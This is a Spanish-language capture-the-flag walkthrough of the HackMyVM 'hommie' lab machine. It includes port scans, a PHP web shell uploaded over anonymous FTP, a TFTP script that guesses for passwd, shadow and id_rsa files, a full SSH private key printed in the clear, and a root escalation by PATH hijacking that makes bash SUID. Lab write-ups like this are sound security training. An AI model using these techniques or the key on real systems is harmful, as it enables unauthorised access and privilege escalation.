---
icon: flag
---

# hommie HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 12:58 EDT
Nmap scan report for 192.168.28.20
Host is up (0.00066s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.28.19
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 c6:27:ab:53:ab:b9:c0:20:37:36:52:a9:60:d3:53:fc (RSA)
|   256 48:3b:28:1f:9a:23:da:71:f6:05:0b:a5:a6:c8:b7:b0 (ECDSA)
|_  256 b3:2e:7c:ff:62:2d:53:dd:63:97:d4:47:72:c8:4e:30 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
MAC Address: 08:00:27:F3:9F:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.43 seconds
```

Vemos varios puertos interesantes, entre ellos el `FTP` y el puerto `80`, vamos a probar a intentar meternos por el `FTP` de forma `anonima`.

## FTP

```shell
ftp anonymous@<IP>
```

Si dejamos la contraseña en blanco veremos que si nos deja y entraremos en el servidor de `FTP`, si listamos el contenido veremos lo siguiente:

```
229 Entering Extended Passive Mode (|||46130|)
150 Here comes the directory listing.
drwxr-xr-x    3 0        113          4096 Sep 30  2020 .
drwxr-xr-x    3 0        113          4096 Sep 30  2020 ..
drwxrwxr-x    2 0        113          4096 Sep 30  2020 .web
-rw-r--r--    1 0        0               0 Sep 30  2020 index.html
226 Directory send OK.
```

Vemos ya una idea de lo que puede ser, si nos pasamos el primer `index.html` veremos que esta vacio, pero si entramos a `.web/` veremos otro `index.html` que si nos lo pasamos a nuestro `host`:

```shell
cd .web/
get index.html
```

Info:

```
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

Y vemos que contiene, veremos el mismo texto que en la pagina web del puerto `80`, por lo que se nos ocurre subir un archivo `.php` para generarnos una `reverse shell`:

> webshell.php

```php
<?php system($_GET['cmd']); ?>
```

Ahora vamos a subir este archivo a la carpeta `.web/` del servidor `FTP` de la siguiente forma:

```shell
put webshell.php
```

Si nos vamos a la pagina web del puerto `80` y ponemos lo siguiente para probar:

```
URL = http://<IP>/webshell.php?cmd=whoami
```

Pero veremos que no funciona, posiblemente por que no tenga `PHP` instalado, por lo que vamos a realizar un poco mas de `fuzzing`.

## Nmap (UDP)

Tras investigar mucho si probamos a enumerar los puertos por `UDP` en vez de por `TCP` veremos lo siguiente:

```shell
nmap -sU --open -Pn -n -v <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-22 13:21 EDT
Initiating ARP Ping Scan at 13:21
Scanning 192.168.28.20 [1 port]
Completed ARP Ping Scan at 13:21, 0.06s elapsed (1 total hosts)
Initiating UDP Scan at 13:21
Scanning 192.168.28.20 [1000 ports]
Increasing send delay for 192.168.28.20 from 0 to 50 due to max_successful_tryno increase to 4
Increasing send delay for 192.168.28.20 from 50 to 100 due to max_successful_tryno increase to 5
Increasing send delay for 192.168.28.20 from 100 to 200 due to max_successful_tryno increase to 6
Increasing send delay for 192.168.28.20 from 200 to 400 due to 11 out of 11 dropped probes since last increase.
UDP Scan Timing: About 4.51% done; ETC: 13:32 (0:10:56 remaining)
Increasing send delay for 192.168.28.20 from 400 to 800 due to 11 out of 12 dropped probes since last increase.
UDP Scan Timing: About 7.17% done; ETC: 13:35 (0:13:09 remaining)
UDP Scan Timing: About 27.70% done; ETC: 13:38 (0:12:24 remaining)
UDP Scan Timing: About 32.77% done; ETC: 13:38 (0:11:29 remaining)
UDP Scan Timing: About 38.45% done; ETC: 13:38 (0:10:34 remaining)
UDP Scan Timing: About 44.02% done; ETC: 13:38 (0:09:40 remaining)
UDP Scan Timing: About 49.50% done; ETC: 13:38 (0:08:43 remaining)
UDP Scan Timing: About 54.81% done; ETC: 13:38 (0:07:50 remaining)
UDP Scan Timing: About 59.90% done; ETC: 13:38 (0:06:58 remaining)
UDP Scan Timing: About 65.16% done; ETC: 13:38 (0:06:04 remaining)
UDP Scan Timing: About 70.28% done; ETC: 13:38 (0:05:11 remaining)
UDP Scan Timing: About 75.31% done; ETC: 13:38 (0:04:18 remaining)
UDP Scan Timing: About 80.53% done; ETC: 13:38 (0:03:24 remaining)
UDP Scan Timing: About 85.80% done; ETC: 13:38 (0:02:29 remaining)
UDP Scan Timing: About 90.92% done; ETC: 13:39 (0:01:36 remaining)
UDP Scan Timing: About 95.96% done; ETC: 13:39 (0:00:43 remaining)
Completed UDP Scan at 13:39, 1083.74s elapsed (1000 total ports)
Nmap scan report for 192.168.28.20
Host is up (0.00067s latency).
Not shown: 998 closed udp ports (port-unreach)
PORT   STATE         SERVICE
68/udp open|filtered dhcpc
69/udp open|filtered tftp
MAC Address: 08:00:27:F3:9F:7C (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 1084.34 seconds
           Raw packets sent: 1394 (64.172KB) | Rcvd: 1086 (78.924KB)
```

Veremos que por `UDP` tenemos los puertos `tftp` y `dhcpc`, pero el que mas nos interesa es el de `tftp`, por lo que haremos lo siguiente:

```shell
tftp <IP>
```

Y veremos que funciona, estaremos dentro, pero no podremos listar ni nada de eso, por lo que vamos a realizar un poco de escaneo probando suerte con nombre de archivos que pueden ser importantes si estuvieran en el directorio.

> scannTFTP.py

```python
#!/bin/python3

import os
import subprocess

tftp_server = "192.168.28.20"
wordlist = [
    "user.txt", "root.txt", "hosts", "config.txt", "backup.conf", "index.html",
    "robots.txt", "passwd", "shadow", "startup-config", "network.conf",
    "id_rsa", "id_rsa.pub", ".bashrc"
]

for filename in wordlist:
    print(f"[+] Intentando descargar: {filename}")
    try:
        result = subprocess.run(
            ["tftp", tftp_server, "-c", "get", filename],
            capture_output=True,
            timeout=2  # ⏱️ Si tarda más de 2 segundos, salta TimeoutExpired
        )
        if b"Error" not in result.stdout and os.path.exists(filename):
            print(f"    [✓] {filename} descargado.")
        else:
            print(f"    [-] No disponible o acceso denegado.")
    except subprocess.TimeoutExpired:
        print(f"    [✗] Timeout: {filename} tardó demasiado (posible archivo inexistente).")
    except Exception as e:
        print(f"    [!] Error con {filename}: {e}")
```

Pero recordemos que cuando entramos en la pagina nos pone esto:

```
alexia, Your id_rsa is exposed, please move it!!!!!
Im fighting regarding reverse shells!
-nobody
```

Por lo que podremos deducir que puede haber algun `id_rsa`, pero probaremos a utilizar el script por si descubrieramos algo mas.

```shell
python3 scannTFTP.py
```

Info:

```
[+] Intentando descargar: user.txt
    [✗] Timeout: user.txt tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: root.txt
    [✗] Timeout: root.txt tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: hosts
    [✗] Timeout: hosts tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: config.txt
    [✗] Timeout: config.txt tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: backup.conf
    [✗] Timeout: backup.conf tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: index.html
    [✗] Timeout: index.html tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: robots.txt
    [✗] Timeout: robots.txt tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: passwd
    [✗] Timeout: passwd tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: shadow
    [✗] Timeout: shadow tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: startup-config
    [✗] Timeout: startup-config tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: network.conf
    [✗] Timeout: network.conf tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: id_rsa
    [✓] id_rsa descargado.
[+] Intentando descargar: id_rsa.pub
    [✗] Timeout: id_rsa.pub tardó demasiado (posible archivo inexistente).
[+] Intentando descargar: .bashrc
    [✗] Timeout: .bashrc tardó demasiado (posible archivo inexistente).
```

Vemos que el unico que funciono es el de `id_rsa`, por lo que vamos a probar dicha clave con el usuario `alexia` ya que comenta en la pagina que es su `id_rsa`.

## Escalate user alexia

### SSH

Establecemos los permisos necesarios para la clave `PEM`:

```shell
chmod 600 id_rsa
```

Ahora si vamos a probar a conectarnos por `SSH`:

```shell
ssh -i id_rsa alexia@<IP>
```

Info:

```
The authenticity of host '192.168.28.20 (192.168.28.20)' can't be established.
ED25519 key fingerprint is SHA256:v3AMNdrxbep3tZ0By0ik1/V+ZHj5ZuiffVZSnafj2YA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.28.20' (ED25519) to the list of known hosts.
Linux hommie 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Sep 30 11:06:15 2020
alexia@hommie:~$ whoami
alexia
```

Veremos que ha funcionado, por lo que leeremos la `flag` del usuario.

> user.txt

```
Imnotroot
```

## Escalate Privileges

Si probamos a listar los permisos `SUID` del usuario, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
140     20 -rwsr-sr-x   1 root     root        16720 Sep 30  2020 /opt/showMetheKey
   146900    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
   268129     12 -rwsr-xr-x   1 root     root        10232 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
   132307     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   131120     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
   131117     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
   134620     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
   134946     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
   131118     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
   131121     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
   134473     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
   134948     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
```

Veremos esta linea bastante interesante:

```
140  20 -rwsr-sr-x   1 root     root    16720 Sep 30  2020 /opt/showMetheKey
```

Vamos a ver que hace este binario:

```shell
/opt/showMetheKey
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
NhAAAAAwEAAQAAAQEApwUR2Pvdhsu1RGG0UIWmj2yDNvs+4VLPG0WWisip6oZrjMjJ40h7
V0zdgZSRFhMxx0/E6ilh2MiMbpAuogCqC3MEodzIzHYAJyK4z/lIqUNdHJbgLDyaY26G0y
Rn1XI+RqLi5NUHBPyiWEuQUEZCMOqi5lS1kaiNHmVqx+rlEs6ZUq7Z6lzYs7da3XcFGuOT
gCnBh1Wb4m4e14yF+Syn4wQVh1u/53XGmeB/ClcdAbSKoJswjI1JqCCkxudwRMUYjq309j
QMxa7bbxaJbkb3hLmMuFU7RGEPu7spLvzRwGAzCuU3f60qJVTp65pzFf3x51j3YAMI+ZBq
kyNE1y12swAAA8i6ZpNpumaTaQAAAAdzc2gtcnNhAAABAQCnBRHY+92Gy7VEYbRQhaaPbI
M2+z7hUs8bRZaKyKnqhmuMyMnjSHtXTN2BlJEWEzHHT8TqKWHYyIxukC6iAKoLcwSh3MjM
dgAnIrjP+UipQ10cluAsPJpjbobTJGfVcj5GouLk1QcE/KJYS5BQRkIw6qLmVLWRqI0eZW
rH6uUSzplSrtnqXNizt1rddwUa45OAKcGHVZvibh7XjIX5LKfjBBWHW7/ndcaZ4H8KVx0B
tIqgmzCMjUmoIKTG53BExRiOrfT2NAzFrttvFoluRveEuYy4VTtEYQ+7uyku/NHAYDMK5T
d/rSolVOnrmnMV/fHnWPdgAwj5kGqTI0TXLXazAAAAAwEAAQAAAQBhD7sthEFbAqtXEAi/
+suu8frXSu9h9sPRL4GrKa5FUtTRviZFZWv4cf0QPwyJ7aGyGJNxGZd5aiLiZfwTvZsUiE
Ua47n1yGWSWMVaZ55ob3N/F9czHg0C18qWjcOh8YBrgGGnZn1r0n1uHovBevMghlsgy/2w
pmlMTtfdUo7JfEKbZmsz3auih2/64rmVp3r0YyGrvOpWuV7spnzPNAFUCjPTwgE2RpBVtk
WeiQtF8IedoMqitUsJU9ephyYqvjRemEugkqkALBJt91yBBO6ilulD8Xv1RBsVHUttE/Jz
bu4XlJXVeD10ooFofrsZd/9Ydz4fx49GwtjYnqsda0rBAAAAgGbx1tdwaTPYdEfuK1kBhu
3ln3QHVx3ZkZ7tNQFxxEjYjIPUQcFFoNBQpIUNOhLCphB8agrhcke5+aq5z2nMdXUJ3DO6
0boB4mWSMml6aGpW4AfcDFTybT6V8pwZcThS9FL3K2JmlZbgPlhkX5fyOmh14/i5ti7r9z
HlBkwMfJJPAAAAgQDPt0ouxdkG1kDNhGbGuHSMAsPibivXEB7/wK7XHTwtQZ7cCQTVqbbs
y6FqG0oSaSz4m2DfWSRZc30351lU4ZEoHJmlL8Ul6yvCjMOnzUzkhrIen131h/MStsQYtY
OZgwwdcG2+N7MReMpbDA9FSHLtHoMLUcxShLSX3ccIoWxqAwAAAIEAzdgK1iwvZkOOtM08
QPaLXRINjIKwVdmOk3Q7vFhFRoman0JeyUbEd0qlcXjFzo02MBlBadh+XlsDUqZSWo7gpp
ivFRbnEu2sy02CHilIJ6vXCQnuaflapCNG8MlG5CtpqfyVoYQ3N3d0PfOWLaB13fGeV/wN
0x2HyroKtB+OeZEAAAANYWxleGlhQGhvbW1pZQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

Vemos que nos esta mostrando un `id_rsa` pero sera el mismo que utilizamos para meternos en la maquina, por lo que vamos a pasarnos el binario a nuestra maquina `host` y decompilarlo con la herramienta `ghidra`:

```shell
python3 -m http.server
```

En la maquina `host` haremos lo siguiente:

```shell
wget http://<IP_VICTIM>:8000/showMetheKey
```

Una vez que lo tengamos dentro, abriremos la herramienta `ghudra` crearemos un proyecto nuevo e importaremos el binario `showMetheKey` para verlo en `C#`, si nos vamos a la funcion `main` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (359).png" alt=""><figcaption></figcaption></figure>

Vemos que se esta ejecutando como `root` de forma interna y que esta leyendo simplemente la `id_rsa` del usuario con el que nos hemos metido, pero vemos un fallo y es que utiliza `cat` con una ruta `relativa` y no `absoluta` encima podemos ejecutarlo como el usuario `root` por lo que podremos realizar una tecnica llamada `PATH hijacking/binary hijacking`, por lo que haremos lo siguiente:

Vamos a crear un script que ponga permisos `SUID` a la `bash` de la siguiente forma:

```shell
nano /tmp/cat

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
echo "Permisos establecidos de forma correcta!"
```

Lo guardamos y ahora vamos a modificar el `PATH` para que cuando lo ejecutemos es ejecute como `root` el script llamado `cat` por lo que tendremos que poner que primero vaya a la ruta `/tmp` para que funcione:

```shell
chmod +x /tmp/cat
export PATH=/tmp:$PATH
```

Ahora si vemos el `PATH`:

```shell
echo $PATH
```

Info:

```
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Veremos que ha funcionado, por lo que vamos a ejecutar de nuevo el `binario`:

```shell
/opt/showMetheKey
```

Info:

```
Permisos establecidos de forma correcta!
```

Por lo que vemos parece que ha funcionado, vamos a comprobarlo de la siguiente forma:

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash
```

Veremos que ha funcionado, por lo que vamos a ejecutar el siguiente comando para ser `root`:

```shell
bash -p
```

Info:

```
bash-5.0# whoami
root
```

Veremos que seremos `root`, por lo que leeremos la `flag` de `root`:

```shell
find / -name "root.txt" 2>/dev/null
```

Info:

```
/usr/include/root.txt
```

> root.txt

```
Imnotbatman
```
